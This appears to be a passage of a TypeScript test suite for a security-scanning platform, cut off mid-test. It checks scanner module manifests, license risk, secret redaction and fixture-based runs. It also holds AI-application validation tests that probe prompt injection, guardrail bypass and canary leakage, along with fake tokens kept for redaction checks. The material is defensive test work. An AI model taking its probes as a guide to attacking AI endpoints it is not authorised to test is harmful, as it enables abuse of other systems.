      "cloud.scoutsuite_posture",
      "exploit.metasploit_check",
      "identity.kerberos_userenum",
      "ot_ics.safe_baseline",
      "trivy.repo_misconfig",
      "detect_secrets.repo_secrets",
      "bandit.python_sast",
      "checkov.iac_posture",
      "pip_audit.python_advisories",
      "dockle.dockerfile_cis",
      "sslyze.tls_posture",
      "tlsx.tls_probe",
      "naabu.port_inventory",
      "gosec.go_sast",
      "kube_linter.manifest_posture",
      "terrascan.iac_posture",
      "kics.iac_posture",
      "kube_score.manifest_score",
      "kube_bench.cis_cluster",
      "conftest.policy_test",
      "cdxgen.sbom_generate",
      "git_secrets.repo_secrets",
      "secretlint.repo_secrets",
      "retirejs.js_advisories",
      "govulncheck.go_advisories",
      "cargo_audit.rust_advisories",
      "yara.repo_rules",
      "amass.passive_enum",
      "falco.rules_validate",
      "kubescape.repo_posture",
      "slsa_verifier.provenance",
      "brakeman.ruby_sast",
      "horusec.multi_sast",
      "dependency_check.sca",
      "talisman.repo_secrets",
      "tfsec.iac_posture",
      "cfn_nag.cloudformation",
      "cfn_lint.cloudformation",
      "whispers.repo_secrets",
      "nancy.go_advisories",
      "sobelow.elixir_sast",
      "polaris.k8s_posture",
      "kubeaudit.k8s_posture",
      "popeye.cluster_sanitizer",
      "katana.web_crawl",
      "cloudlist.cloud_assets",
      "parliament.iam_policy",
      "semgrep.repo_sast",
      "trufflehog.repo_secrets",
      "hadolint.dockerfile",
      "sslscan.tls_probe",
      "lynis.host_audit",
      "rustscan.port_inventory",
      "cve_bin_tool.binary_cves"
    ]);
  });

  it("never exposes a mock/demo module in the production registry or catalog", () => {
    const mockMarker = /(^|[._-])(mock|demo|fixture|fake|sample)([._-]|$)/i;
    for (const manifest of listModuleManifests()) {
      expect(mockMarker.test(manifest.moduleId)).toBe(false);
      expect(mockMarker.test(manifest.toolName)).toBe(false);
    }
    expect(getModuleById("mock.external_exposure")).toBeNull();
    expect(getModuleById("mock.github_secret_scan")).toBeNull();
    expect(getModuleById("mock.cloud_posture")).toBeNull();
    expect(getModuleById("mock.ai_app_validation")).toBeNull();
    expect(getModuleById("mock.control_validation")).toBeNull();
  });

  it("keeps mock modules available only through the test fixture", async () => {
    const context = createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { hostname: "demo.periscan.local" }
    });
    const output = await executeMockModuleById(
      "mock.external_exposure",
      context
    );
    expect(output.validationState).toBe("Reachable");
    expect(getMockModuleById("mock.github_secret_scan")).not.toBeNull();
  });

  it("keeps module and tool/capability IDs aligned", () => {
    const moduleManifests = listModuleManifests();
    const moduleIds = new Set(
      moduleManifests.map((manifest) => manifest.moduleId)
    );
    const tools = listOpenSourceToolDefinitions({
      includeDeferred: true,
      includeLegalReview: true,
      phase: "all"
    });
    const toolIds = new Set(tools.map((tool) => tool.toolId));
    const capabilities = listOpenSourceCapabilities({
      includeDeferred: true,
      includeLegalReview: true,
      phase: "all"
    });

    for (const tool of tools) {
      for (const moduleId of tool.moduleIds) {
        expect(moduleIds.has(moduleId)).toBe(true);
      }
    }

    for (const manifest of moduleManifests) {
      for (const toolId of manifest.toolIds) {
        expect(toolIds.has(toolId)).toBe(true);
      }
    }

    for (const capability of capabilities) {
      if (capability.moduleId) {
        expect(moduleIds.has(capability.moduleId)).toBe(true);
      }
      expect(toolIds.has(capability.toolId)).toBe(true);
    }
  });

  it("exposes first-class runtime and safety metadata on every module manifest", () => {
    for (const manifest of listModuleManifests()) {
      expect(
        manifest.executionCommandTemplate.length,
        manifest.moduleId
      ).toBeGreaterThan(0);
      expect(manifest.installCheckCommand, manifest.moduleId).toEqual(
        expect.any(Array)
      );
      expect(manifest.versionCommand, manifest.moduleId).toEqual(
        expect.any(Array)
      );
      expect(manifest.licenseRisk, manifest.moduleId).toMatch(
        /^(Allowed|RequiresLegalReview|Blocked)$/
      );
      expect(manifest.redactionRules.length, manifest.moduleId).toBeGreaterThan(
        0
      );
      expect(manifest.maintainer, manifest.moduleId).toBe(
        "Periscan Security Engineering"
      );
      expect(manifest.status, manifest.moduleId).toMatch(
        /^(Implemented|FixtureOnly|Deferred|Blocked)$/
      );

      if (manifest.toolIds.length > 0) {
        expect(manifest.toolVersion, manifest.moduleId).toContain(
          manifest.toolIds[0]
        );
        // Tool-backed modules must declare the primary tool SPDX (no dual-truth).
        const primaryTool = getOpenSourceToolDefinition(manifest.toolIds[0]!);
        expect(primaryTool, `${manifest.moduleId} primary tool`).toBeTruthy();
        expect(
          manifest.license,
          `${manifest.moduleId} license must match primary tool ${primaryTool?.toolId}`
        ).toBe(primaryTool?.license);
        // licenseRisk must honor tool SPDX + policyStatus, not only module.license.
        expect(
          manifest.licenseRisk,
          `${manifest.moduleId} licenseRisk must match deriveLicenseRisk`
        ).toBe(
          deriveLicenseRisk({
            license: manifest.license,
            toolIds: manifest.toolIds
          })
        );
        if (primaryTool?.policyStatus === "RequiresLegalReview") {
          expect(
            manifest.licenseRisk,
            `${manifest.moduleId} must elevate risk when tool policyStatus is RequiresLegalReview`
          ).not.toBe("Allowed");
        }
      } else {
        expect(manifest.toolVersion, manifest.moduleId).toBeNull();
      }

      if (
        manifest.executionMode === "ExternalPoA" ||
        (manifest.resourceLimits.maxNetworkRequests ?? 0) > 0
      ) {
        expect(manifest.networkAccessRequired, manifest.moduleId).toBe(true);
      }

      if (manifest.safetyLevel === "PassiveReadOnly") {
        expect(manifest.writesToTarget, manifest.moduleId).toBe(false);
        expect(manifest.canModifyTarget, manifest.moduleId).toBe(false);
        expect(manifest.canExecuteCode, manifest.moduleId).toBe(false);
        expect(manifest.canExfiltrateData, manifest.moduleId).toBe(false);
        expect(manifest.destructivePotential, manifest.moduleId).toBe("None");
      }
    }

    const gitleaks = getModuleById("gitleaks.repo_secrets")!.manifest;
    expect(gitleaks.containerImage).toContain("gitleaks");
    expect(gitleaks.networkAccessRequired).toBe(false);
    expect(gitleaks.dataSensitivity).toBe("High");
    expect(gitleaks.redactionRules).toEqual(
      expect.arrayContaining([
        "periscan.raw-output-redaction",
        "periscan.secret-value-redaction"
      ])
    );

    const nuclei = getModuleById("nuclei.external_exposure_safe")!.manifest;
    expect(nuclei.networkAccessRequired).toBe(true);
    expect(nuclei.writesToTarget).toBe(false);
    expect(nuclei.destructivePotential).toBe("Low");

    const caldera = getModuleById("caldera.advanced_adversarial")!.manifest;
    expect(caldera.liveSupported).toBe(false);
    expect(caldera.destructivePotential).toBe("Moderate");
  });

  it("derives licenseRisk from tool disposition, not only module.license (P15-4)", () => {
    // Proprietary alone looks Allowed — linked GPL tool must elevate risk.
    expect(
      deriveLicenseRisk({
        license: "Proprietary",
        toolIds: ["nikto"]
      })
    ).toBe("RequiresLegalReview");

    // MIT module label cannot launder LGPL Semgrep + RequiresLegalReview policy.
    expect(
      deriveLicenseRisk({
        license: "MIT",
        toolIds: ["semgrep"]
      })
    ).toBe("RequiresLegalReview");

    // AGPL is hard-blocked regardless of toolIds.
    expect(
      deriveLicenseRisk({
        license: "AGPL-3.0",
        toolIds: []
      })
    ).toBe("Blocked");

    // Permissive first-party modules stay Allowed.
    expect(
      deriveLicenseRisk({
        license: "MIT",
        toolIds: ["gitleaks"]
      })
    ).toBe("Allowed");

    // Deferred policy (Caldera) is readiness, not license elevation when SPDX is permissive.
    expect(
      deriveLicenseRisk({
        license: "Apache-2.0",
        toolIds: ["caldera"]
      })
    ).toBe("Allowed");

    // Real executable modules that wrap review-gated GPL/LGPL engines.
    for (const moduleId of [
      "web.sqli_probe",
      "web.nikto_scan",
      "cloud.scoutsuite_posture",
      "web.tls_audit"
    ]) {
      const module = getModuleById(moduleId);
      expect(module, moduleId).toBeTruthy();
      expect(
        module!.manifest.licenseRisk,
        `${moduleId} must not report Allowed for review-gated tools`
      ).toBe("RequiresLegalReview");
    }
  });

  it("executes a module and returns normalized output", async () => {
    const context = createContext({
      safetyLevel: "ActiveNonInvasive",
      target: {
        hostname: "demo.periscan.local"
      }
    });

    const output = await executeMockModuleById(
      "mock.external_exposure",
      context
    );

    expect(output.validationState).toBe("Reachable");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.tenantId).toBe(context.tenantId);
    expect(output.evidence[0]?.artifactType).toBe("NormalizedEvidence");
  });

  it("validates module-specific inputs before execution", async () => {
    const module = getMockModuleById("mock.github_secret_scan");

    expect(module).not.toBeNull();

    await expect(
      module!.execute(
        createContext({
          target: {}
        })
      )
    ).rejects.toThrow(/repository/i);
  });

  it("runs the gitleaks wrapper against the fixture repository without leaking raw secrets", async () => {
    const fixtureRepositoryPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/gitleaks/repo-with-fake-secret"
    );
    const output = await executeModuleById(
      "gitleaks.repo_secrets",
      createContext({
        target: {
          fixtureMode: true,
          repositoryName: "periscan-fixtures/demo-app",
          repositoryPath: fixtureRepositoryPath
        }
      })
    );

    expect(output.outcome).toBe("secret_exposure_observed");
    expect(output.validationState).toBe("Validated");
    expect(
      output.signals.map(
        (signal) => `${signal.signalCategory}:${signal.signalSubcategory}`
      )
    ).toEqual(
      expect.arrayContaining([
        "Exposure:SecretExposure",
        "Repository:SecretScanCandidate"
      ])
    );
    expect(output.evidence).toHaveLength(1);
    const secretPreview = String(output.evidence[0]?.attributes.secretPreview);
    expect(secretPreview).toMatch(/^\[REDACTED(:[a-z]+)?\]$/);
    expect(secretPreview).not.toContain("ghp_");
    expect(JSON.stringify(output.evidence[0]?.attributes)).not.toContain(
      "ghp_periscanfixturetoken1234567890"
    );
  });

  it("runs Trivy repository dependency scanning against a fixture report", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/trivy/repo-dependency-fixture.json"
    );
    const output = await executeModuleById(
      "trivy.repo_dependency_scan",
      createContext({
        target: {
          fixtureMode: true,
          fixtureReportPath,
          repositoryName: "periscan-fixtures/demo-app",
          repositoryPath: "/tmp/demo-app"
        }
      })
    );

    expect(output.outcome).toBe("dependency_exposure_observed");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "DependencyVulnerability"
    );
    expect(output.evidence[0]?.attributes.vulnerabilityId).toBe(
      "CVE-2024-11111"
    );
  });

  it("runs Trivy container scanning against a fixture report", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/trivy/container-image-fixture.json"
    );
    const output = await executeModuleById(
      "trivy.container_scan",
      createContext({
        target: {
          fixtureMode: true,
          fixtureReportPath,
          imageRef: "registry.example.com/periscan/demo-api:1.0.0"
        }
      })
    );

    expect(output.outcome).toBe("container_exposure_observed");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe("ContainerVulnerability");
    expect(output.evidence[0]?.attributes.packageName).toBe("openssl");
  });

  it("generates a normalized CycloneDX inventory without retaining raw Syft output", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/syft/repository-sbom-fixture.json"
    );
    const output = await executeModuleById(
      "syft.sbom_generate",
      createContext({
        target: {
          fixtureMode: true,
          fixtureReportPath,
          repositoryName: "periscan-fixtures/demo-app",
          repositoryPath: "/tmp/demo-app"
        }
      })
    );

    expect(output.outcome).toBe("sbom_generated");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      bomFormat: "CycloneDX",
      componentCount: 2,
      measured: false,
      specVersion: "1.6"
    });
    expect(output.evidence[1]?.attributes).toMatchObject({
      rawOutputRetained: false
    });
    expect(JSON.stringify(output.evidence)).not.toContain("serialNumber");
  });

  it("keeps Cosign fixture results visibly non-measured", async () => {
    const digest = "a".repeat(64);
    const output = await executeModuleById(
      "sigstore.cosign_verify_blob",
      createContext({
        target: {
          artifactPath: "/tmp/artifact.tar",
          bundlePath: "/tmp/artifact.sigstore.json",
          fixtureMode: true,
          fixtureVerification: {
            artifactSha256: digest,
            bundleSha256: "b".repeat(64),
            publicKeySha256: "c".repeat(64),
            verified: true
          },
          publicKeyPath: "/tmp/cosign.pub"
        }
      })
    );

    expect(output.outcome).toBe("artifact_signature_verified");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      artifactSha256: digest,
      fixture: true,
      measured: false,
      networkAccess: "disabled",
      verified: true
    });
  });

  it("runs OSV advisory cross-check against a fixture report", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/osv/repo-advisory-fixture.json"
    );
    const output = await executeModuleById(
      "osv.repo_dependency_scan",
      createContext({
        target: {
          fixtureMode: true,
          fixtureReportPath,
          repositoryName: "periscan-fixtures/demo-app",
          repositoryPath: "/tmp/demo-app"
        }
      })
    );

    expect(output.outcome).toBe("dependency_advisory_observed");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.sourceVendor).toBe("OSV");
    expect(output.evidence[0]?.attributes.aliases).toContain("CVE-2024-11111");
  });

  it("runs the prowler wrapper against the fixture report and maps findings into exposures", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/prowler/aws-posture-fixture.json"
    );
    const output = await executeModuleById(
      "prowler.aws_posture",
      createContext({
        target: {
          awsAccountId: "123456789012",
          fixtureMode: true,
          fixtureReportPath
        }
      })
    );

    expect(output.outcome).toBe("cloud_misconfiguration_observed");
    expect(output.validationState).toBe("Validated");
    expect(
      output.signals.map(
        (signal) => `${signal.signalCategory}:${signal.signalSubcategory}`
      )
    ).toEqual(
      expect.arrayContaining([
        "Cloud:PublicExposure",
        "Exposure:CloudMisconfiguration",
        "ControlObservation:NeedsTuning"
      ])
    );
    expect(output.evidence).toHaveLength(2);
    expect(output.evidence[0]?.attributes.checkId).toBeTruthy();
    expect(output.evidence[0]?.attributes.remediation).toBeTruthy();
  });

  it("advertises repository-secret fix verification modules as executable retests", () => {
    expect(
      getModuleById("gitleaks.repo_secrets")?.manifest.supportedMissionTypes
    ).toContain("FixVerification");
    expect(
      getModuleById("prowler.aws_posture")?.manifest.supportedMissionTypes
    ).toContain("FixVerification");
  });

  it("runs the live Grype module against the fixture report", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/grype/repo-vuln-fixture.json"
    );
    const output = await executeModuleById(
      "grype.repo_vulnerability_scan",
      createContext({
        target: {
          fixtureMode: true,
          fixtureReportPath,
          repositoryName: "demo-app",
          repositoryPath: "/tmp/demo-app"
        }
      })
    );
    expect(output.outcome).toBe("vulnerability_inventory_observed");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.sourceVendor).toBe("Grype");
  });

  it("runs the nuclei wrapper against the safe fixture report", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/nuclei/safe-exposure-fixture.json"
    );
    const output = await executeModuleById(
      "nuclei.external_exposure_safe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureReportPath,
          hostname: "app.example.com",
          rateLimit: 10,
          templateProfile: "safe-baseline"
        }
      })
    );

    expect(output.outcome).toBe("external_exposure_observed");
    expect(output.validationState).toBe("Validated");
    expect(
      output.signals.map(
        (signal) => `${signal.signalCategory}:${signal.signalSubcategory}`
      )
    ).toEqual(
      expect.arrayContaining([
        "Exposure:ExternalExposure",
        "Asset:ServiceObservation"
      ])
    );
    expect(output.evidence[0]?.attributes.templateProfile).toBe(
      "safe-baseline"
    );
  });

  it("falls back to template-id when nuclei info.name is missing (P15-8)", async () => {
    const tempDir = await mkdtemp(path.join(tmpdir(), "periscan-nuclei-name-"));
    const fixtureReportPath = path.join(tempDir, "no-name-fixture.json");
    await writeFile(
      fixtureReportPath,
      JSON.stringify([
        {
          host: "https://app.example.com",
          info: {
            description: "Observation without a template display name.",
            severity: "info"
          },
          "matched-at": "https://app.example.com/",
          "template-id": "http-security-headers"
        }
      ]),
      "utf8"
    );

    try {
      const output = await executeModuleById(
        "nuclei.external_exposure_safe",
        createContext({
          safetyLevel: "ActiveNonInvasive",
          target: {
            fixtureMode: true,
            fixtureReportPath,
            hostname: "app.example.com",
            rateLimit: 10,
            templateProfile: "safe-baseline"
          }
        })
      );

      expect(output.outcome).toBe("external_exposure_observed");
      expect(output.evidence[0]?.attributes.templateId).toBe(
        "http-security-headers"
      );
      expect(output.evidence[0]?.attributes.templateName).toBe(
        "http-security-headers"
      );
      expect(String(output.evidence[0]?.attributes.templateName)).not.toMatch(
        /Periscan Safe HTTP Fingerprint/u
      );
    } finally {
      await rm(tempDir, { force: true, recursive: true });
    }
  });

  it("supports narrowed safe Nuclei template profiles", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/nuclei/safe-exposure-fixture.json"
    );
    const output = await executeModuleById(
      "nuclei.external_exposure_safe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureReportPath,
          hostname: "app.example.com",
          templateProfile: "safe-http-headers"
        }
      })
    );

    expect(output.outcome).toBe("external_exposure_observed");
    expect(output.evidence[0]?.attributes.templateProfile).toBe(
      "safe-http-headers"
    );
  });

  it("does not collect Nuclei docker JSONL via a host /out bind-mount", async () => {
    const source = await readFile(
      fileURLToPath(new URL("./index.ts", import.meta.url)),
      "utf8"
    );
    const runNucleiCli = source.slice(
      source.indexOf("async function runNucleiCli"),
      source.indexOf("async function loadNucleiFindings")
    );

    expect(runNucleiCli.length).toBeGreaterThan(200);
    expect(runNucleiCli).toContain("-jsonl");
    expect(runNucleiCli).not.toContain("/out/report.jsonl");
    expect(runNucleiCli).not.toMatch(/target:\s*"\/out"/);
  });

  it("rejects unallowlisted Nuclei template profiles", async () => {
    await expect(
      executeModuleById(
        "nuclei.external_exposure_safe",
        createContext({
          safetyLevel: "ActiveNonInvasive",
          target: {
            fixtureMode: true,
            hostname: "app.example.com",
            templateProfile: "unsafe-profile"
          }
        })
      )
    ).rejects.toThrow();
  });

  it("runs the safe AI validation suite with ATT&CK-linked evidence", async () => {
    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Periscan Copilot",
          endpointUrl: "https://ai.periscan.local",
          fixtureOutcome: "LeakageObserved",
          validationCategory: "SensitiveDataLeakage"
        }
      })
    );

    expect(output.validationState).toBe("Exploitable");
    expect(output.signals[0]?.signalCategory).toBe("AIApplication");
    expect(output.signals[0]?.signalSubcategory).toBe("LeakageObserved");
    expect(output.signals[0]?.techniqueIds).toContain("T1552");
    expect(output.evidence.map((item) => item.artifactType)).toEqual(
      expect.arrayContaining(["RawModuleOutput", "NormalizedEvidence"])
    );
  });

  it("defaults safe AI validation to packaged fixtures when fixture mode is explicit", async () => {
    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Periscan Copilot",
          endpointUrl: "https://ai.periscan.local",
          fixtureMode: true
        }
      })
    );

    expect(output.outcome).toBe("ai_risk_observed");
    expect(output.signals.length).toBeGreaterThan(0);
    expect(output.evidence[0]?.attributes.harness).toBe("promptfoo");
    expect(JSON.stringify(output.evidence)).not.toContain("AKIA");
  });

  it("runs the PyRIT alternate AI validation harness from fixture output", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/ai/pyrit-safe-validation-fixture.json"
    );
    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          endpointUrl: "https://ai.periscan.local",
          fixtureMode: true,
          fixtureReportPath,
          harness: "pyrit"
        }
      })
    );

    expect(output.outcome).toBe("ai_risk_observed");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "UnauthorizedRetrievalObserved"
    );
    expect(JSON.stringify(output.evidence)).not.toContain("tenant fixture");
    expect(output.evidence[0]?.attributes.harness).toBe("pyrit");
  });

  it("imports Garak safe AI validation reports through the same evidence path", async () => {
    const fixtureReportPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/ai/garak-safe-validation-fixture.json"
    );
    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          endpointUrl: "https://ai.periscan.local",
          fixtureMode: true,
          fixtureReportPath,
          harness: "garak"
        }
      })
    );

    expect(output.outcome).toBe("ai_risk_observed");
    expect(output.validationState).toBe("Exploitable");
    expect(output.signals[0]?.sourceType).toContain("garak.suite");
    expect(output.signals[0]?.signalSubcategory).toBe("GuardrailBypassed");
    expect(output.evidence[0]?.attributes.harness).toBe("garak");
    expect(JSON.stringify(output.evidence)).toContain("[REDACTED]");
    expect(JSON.stringify(output.evidence)).not.toContain(
      "garak-secret-token-1234567890"
    );
  });

  it("imports OpenCTI STIX context without claiming validation proof", async () => {
    const fixtureBundlePath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/opencti/stix-bundle-fixture.json"
    );
    const output = await executeModuleById(
      "opencti.threat_context_import",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureBundlePath,
          fixtureMode: true,
          sourceName: "OpenCTI Fixture"
        }
      })
    );

    expect(output.outcome).toBe("opencti_context_imported");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(4);
    expect(
      output.signals.every((signal) => signal.signalCategory === "Exposure")
    ).toBe(true);
    expect(output.signals[0]?.signalSubcategory).toBe(
      "ThreatIntelContextImported"
    );
    expect(output.evidence[0]?.attributes).toMatchObject({
      importOnly: true,
      normalizedItemCount: 4,
      sourceName: "OpenCTI Fixture",
      stixObjectCount: 3,
      validationProof: false
    });
    const normalizedItems = output.evidence[0]?.attributes
      .normalizedItems as Array<Record<string, unknown>>;

    expect(normalizedItems.map((item) => item.canonicalKey)).toEqual(
      expect.arrayContaining([
        "advisory:opencti:report--periscan-advisory-context",
        "cve:CVE-2026-4242",
        "ioc:domain:login.bad.example",
        "ioc:ipv4:203.0.113.42"
      ])
    );
    expect(JSON.stringify(output.evidence)).toContain("T1566.002");
    expect(JSON.stringify(output.evidence)).toContain("[REDACTED]");
    expect(JSON.stringify(output.evidence)).not.toContain(
      "fixture-secret-token-123456"
    );
  });

  it("imports Sigma detection rule content without claiming control detection", async () => {
    const fixtureRulePath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/sigma/sigma-rule-fixture.yml"
    );
    const output = await executeModuleById(
      "sigma.detection_rule_import",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          controlSourceId: "control-siem-1",
          fixtureMode: true,
          fixtureRulePath
        }
      })
    );

    expect(output.outcome).toBe("sigma_rules_imported");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalCategory).toBe("ControlObservation");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "DetectionRuleContentImported"
    );
    expect(output.signals[0]?.techniqueIds).toEqual(["T1059.001"]);
    expect(output.evidence[0]?.attributes).toMatchObject({
      controlSourceId: "control-siem-1",
      deployedByPeriscan: false,
      level: "high",
      measured: true,
      ruleFormat: "sigma",
      title: "Suspicious PowerShell Encoded Command"
    });
    expect(output.evidence[0]?.attributes.tactics).toEqual(["Execution"]);
  });

  it("maps normalized Periscan evidence into OCSF-compatible envelopes without claiming validation proof", async () => {
    const fixtureMappingPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/ocsf/evidence-mapping-fixture.json"
    );
    const output = await executeModuleById(
      "ocsf.evidence_mapping",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureMappingPath,
          fixtureMode: true
        }
      })
    );

    expect(output.outcome).toBe("ocsf_records_mapped");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalCategory).toBe("Evidence");
    expect(output.signals[0]?.signalSubcategory).toBe("OcsfEvidenceMapped");
    expect(output.evidence[0]?.attributes).toMatchObject({
      mappedRecordCount: 2,
      schema: "ocsf",
      schemaVersion: "1.6.0",
      validationProof: false
    });
    const mappedEvents = output.evidence[0]?.attributes.mappedEvents as Array<
      Record<string, unknown>
    >;
    expect(mappedEvents[0]).toMatchObject({
      className: "Vulnerability Finding",
      periscan: {
        signalCategory: "Exposure",
        validationProof: false
      },
      severity: {
        severity: "High",
        severityId: 4
      }
    });
    expect(JSON.stringify(mappedEvents)).toContain("CVE-2026-12345");
  });

  it("runs live-safe AI validation with bounded test cases and redacted evidence", async () => {
    const promptfoo = getOpenSourceToolDefinition("promptfoo");

    if (!promptfoo) {
      throw new Error(
        "Promptfoo catalog definition is required for this test."
      );
    }

    resolveOpenSourceToolRuntimeMock.mockResolvedValueOnce({
      available: true,
      command: "promptfoo",
      displayCommand: "promptfoo",
      imageRef: null,
      reason: "Promptfoo test runtime is available.",
      runtime: "binary",
      tool: promptfoo,
      version: promptfoo.defaultVersion
    });

    const fetchMock = vi.fn<typeof fetch>(async () => {
      return new Response(
        "The test endpoint stayed within policy. token=live-secret-token-1234567890",
        {
          status: 200
        }
      );
    });
    vi.stubGlobal("fetch", fetchMock);

    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Customer Copilot",
          endpointUrl: "https://customer.example.test/ai/safe-validation",
          harness: "promptfoo",
          safeTestCases: [
            {
              category: "GuardrailDrift",
              input:
                "Periscan safe validation: confirm this endpoint only uses authorized test data.",
              testCaseId: "customer-safe-guardrail"
            }
          ],
          timeoutSeconds: 1,
          validationCategory: "GuardrailDrift"
        }
      })
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const requestBody = JSON.parse(
      String(fetchMock.mock.calls[0]?.[1]?.body ?? "{}")
    ) as {
      input: string;
      metadata: Record<string, unknown>;
    };
    expect(requestBody.metadata).toMatchObject({
      periscanSafeValidation: true,
      testCaseId: "customer-safe-guardrail"
    });
    expect(requestBody.input).toContain("authorized test data");
    // A benign endpoint probe (no adversarial harness executed) must NOT claim a
    // passed AI validation: it is reachability/policy-boundary evidence only.
    expect(output.outcome).toBe("ai_endpoint_probe_completed");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes.redactedResponse).toContain(
      "[REDACTED]"
    );
    expect(output.evidence[1]?.attributes.outcome).toBe("Inconclusive");
    expect(JSON.stringify(output.evidence)).not.toContain('"outcome":"Passed"');
    expect(JSON.stringify(output.evidence)).not.toContain(
      "live-secret-token-1234567890"
    );
  });

  it("runs the real bounded synthetic-canary suite within its request and byte budget", async () => {
    const fetchMock = vi.fn<typeof fetch>(
      async () =>
        new Response(JSON.stringify({ answer: "POLICY_HELD" }), { status: 200 })
    );
    vi.stubGlobal("fetch", fetchMock);

    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Authorized Local Copilot",
          boundedSuite: true,
          corpusVersion: "periscan-benign-v1",
          endpointUrl: "http://127.0.0.1:3999/ai",
          harness: "periscan",
          maxRequests: 1,
          maxResponseBytes: 512,
          timeoutSeconds: 1,
          validationCategory: "IndirectPromptInjection"
        }
      })
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const requestBody = JSON.parse(
      String(fetchMock.mock.calls[0]?.[1]?.body ?? "{}")
    ) as { input: string; metadata: Record<string, unknown> };
    expect(requestBody.input).toContain("Untrusted synthetic document");
    expect(requestBody.metadata).toMatchObject({
      corpusVersion: "periscan-benign-v1",
      periscanAuthorizedSyntheticTest: true
    });
    expect(output.outcome).toBe("ai_validation_passed");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.sourceType).toContain(
      "periscan.bounded_live_suite"
    );
    expect(output.evidence[0]?.attributes).toMatchObject({
      corpusVersion: "periscan-benign-v1",
      measured: true,
      method: "bounded_live_suite",
      passFail: "pass",
      requestBytes: expect.any(Number),
      responseBytes: expect.any(Number)
    });
    expect(output.evidence[1]?.attributes).toMatchObject({
      maximumRequests: 1,
      maximumResponseBytes: 512,
      measured: true,
      passFail: "pass"
    });
    expect(JSON.stringify(output.evidence)).toContain("ISO/IEC 42001");
  });

  it("marks fixture AI validation evidence measured:false with passFail", async () => {
    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Fixture Copilot",
          endpointUrl: "https://customer.example.test/ai/fixture",
          fixtureMode: true,
          fixtureOutcome: "GuardrailHeld",
          harness: "promptfoo",
          validationCategory: "PromptInjection"
        }
      })
    );

    expect(output.outcome).toBe("ai_validation_passed");
    for (const item of output.evidence) {
      expect(item.attributes.measured).toBe(false);
    }
    expect(
      output.evidence.some((item) => item.attributes.passFail === "pass")
    ).toBe(true);
    expect(output.summary).toMatch(/measured:false/i);
  });

  it("reports an exploitable result when the authorized endpoint returns the disposable canary", async () => {
    const fetchMock = vi.fn<typeof fetch>(async (_url, init) => {
      const request = JSON.parse(String(init?.body ?? "{}")) as {
        input: string;
      };
      const canary = request.input.match(/PERISCAN_CANARY_[A-F0-9]+/u)?.[0];
      return new Response(`unsafe echo ${canary ?? "missing"}`, {
        status: 200
      });
    });
    vi.stubGlobal("fetch", fetchMock);

    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          boundedSuite: true,
          endpointUrl: "http://127.0.0.1:3999/ai",
          harness: "periscan",
          maxRequests: 1,
          maxResponseBytes: 512,
